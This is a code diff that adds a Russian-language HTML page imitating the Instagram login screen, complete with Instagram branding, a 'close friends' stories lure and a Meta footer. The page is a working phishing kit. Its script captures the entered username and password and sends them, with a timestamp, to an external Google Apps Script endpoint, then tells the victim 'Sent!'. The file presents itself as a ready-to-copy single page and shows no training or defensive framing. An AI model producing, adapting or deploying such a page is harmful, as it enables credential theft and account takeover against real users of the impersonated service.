@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        /* Весь CSS будет внутри, чтобы вы могли скопировать одним файлом */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Центральный контейнер */
+        .login-container {
+            max-width: 420px;
+            width: 100%;
+        }
+
+        /* Карточка входа */
+        .login-card {
+            background: #1c1c1c;
+            border-radius: 12px;
+            padding: 40px 30px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        /* Аватарка в стиле Instagram */
+        .story-avatar {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .avatar-ring {
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #feda77, #f58529, #dd2a7b, #8134af, #515bd4);
+            padding: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .avatar-ring:hover {
+            transform: scale(1.02);
+        }
+
+        .avatar-inner {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background-color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .avatar-inner i {
+            font-size: 70px;
+            color: #a8a8a8;
+        }
+
+        .avatar-caption {
+            margin-top: 10px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #ccc;
+        }
+
+        /* Заголовок */
+        .main-text {
+            font-size: 22px;
+            font-weight: 400;
+            line-height: 1.4;
+            margin-bottom: 35px;
+            color: #f0f0f0;
+        }
+
+        .highlight {
+            color: #ff2d95;
+            font-weight: 500;
+        }
+
+        /* Форма */
+        .input-group {
+            position: relative;
+            margin-bottom: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 12px 10px 12px;
+            background: #121212;
+            border: 1px solid #444;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #ffffff;
+            outline: none;
+            transition: all 0.25s ease;
+        }
+
+        input:focus {
+            border-color: #0095f6;
+            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.2);
+        }
+
+        label {
+            position: absolute;
+            left: 13px;
+            top: 14px;
+            font-size: 15px;
+            color: #aaaaaa;
+            pointer-events: none;
+            transition: all 0.25s ease;
+            background: #121212;
+            padding: 0 4px;
+        }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #0095f6;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 20px 0 15px 0;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1877f2;
+        }
+
+        .forgot-password {
+            color: #0095f6;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0 25px 0;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 20px 0;
+            position: relative;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #444;
+        }
+
+        .divider span {
+            background: #1c1c1c;
+            padding: 0 20px;
+        }
+
+        .facebook-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 15px;
+            margin: 15px 0;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .facebook-btn:hover {
+            background: rgba(255,255,255,0.05);
+        }
+
+        .create-account {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: transparent;
+            color: #0095f6;
+            border: 1px solid #0095f6;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            text-align: center;
+            transition: all 0.2s;
+        }
+
+        .create-account:hover {
+            background: rgba(0, 149, 246, 0.1);
+        }
+
+        /* Сообщение об ошибке */
+        .message {
+            margin-top: 15px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        /* Meta внизу */
+        .meta-footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #777;
+        }
+
+        .meta-footer a {
+            color: #777;
+            text-decoration: none;
+        }
+
+        .meta-footer a:hover {
+            text-decoration: underline;
+            color: #999;
+        }
+
+        /* Адаптивность */
+        @media (max-width: 500px) {
+            .login-card {
+                padding: 30px 20px;
+            }
+            .avatar-ring {
+                width: 80px;
+                height: 80px;
+            }
+            .avatar-inner i {
+                font-size: 58px;
+            }
+            .main-text {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <!-- Аватарка в стиле Instagram -->
+            <div class="story-avatar">
+                <div class="avatar-ring">
+                    <div class="avatar-inner">
+                        <img src="https://th.bing.com/th/id/R.735dda68880a385ce8cc5be4f3c5fcd6?rik=qSxRw2lCZYy9Mw&riu=http%3a%2f%2fpngimg.com%2fuploads%2finstagram%2finstagram_PNG11.png&ehk=QVCbfkCKi8pJLF08bRkS%2fLeMqLTnJQf402WRaIdN6jE%3d&risl=&pid=ImgRaw&r=0.jpg" alt="avatar" style="width:100%; height:100%; object-fit:cover;"><!-- Замените на <img> если нужно -->
+                    </div>
+                </div>
+                <p class="avatar-caption">Ваша история</p>
+            </div>
+
+            <!-- Заголовок как на скриншоте -->
+            <h1 class="main-text">
+                Посмотрите, какими моментами из жизни поделились ваши 
+                <span class="highlight">близкие друзья</span>.
+            </h1>
+
+            <!-- Форма входа -->
+            <form id="loginForm">
+    <div class="input-group">
+        <input type="text" id="username" placeholder=" " required>
+        <label for="username">Имя пользователя, номер мобильного телефона или электронный адрес</label>
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" placeholder=" " required>
+        <label for="password">Пароль</label>
+    </div>
+
+    <button type="submit" id="loginBtn">Войти</button>
+</form>
+
+            <a href="#" class="forgot-password">Забыли пароль?</a>
+
+            <div class="divider">
+                <span>или</span>
+            </div>
+
+            <a href="#" class="facebook-btn">
+                <i class="fab fa-facebook-square"></i>
+                Войти через Facebook
+            </a>
+
+            <a href="#" class="create-account">Создать новый аккаунт</a>
+
+            <p id="msg" class="message"></p>
+        </div>
+
+        <!-- Meta внизу (как на скриншоте) -->
+        <div class="meta-footer">
+            <a href="#">Meta</a>
+        </div>
+    </div>
+
+    <script>
+        // Ваш существующий script.js скопируйте сюда или оставьте внешним
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const msgElement = document.getElementById('msg');
+
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzDR_IAsMsXLmxFS8ggh5TlwCED-FmW6K82a29a7chEHkHGCKJvJCrLmNqD3g0O78td/exec";
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (username === '' || password === '') {
+                showMessage("Пожалуйста, заполните все поля", "red");
+                return;
+            }
+
+            loginBtn.textContent = 'Отправка...';
+            loginBtn.disabled = true;
+
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: {
+                        "Content-Type": "text/plain;charset=utf-8"
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                showMessage("Отправлено!", "green");
+
+            } catch (error) {
+                console.error("Ошибка отправки:", error);
+                showMessage("Ошибка при отправке. Попробуйте позже.", "red");
+            } finally {
+                setTimeout(() => {
+                    loginBtn.textContent = 'Войти';
+                    loginBtn.disabled = false;
+                }, 1500);
+            }
+        });
+
+        function showMessage(text, color) {
+            if (msgElement) {
+                msgElement.innerText = text;
+                msgElement.style.color = color;
+            } else {
+                alert(text);
+            }
+        }
+
+        function checkInputs() {
+            const filled = usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '';
+            loginBtn.disabled = !filled;
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+    </script>
+</body>
+</html>
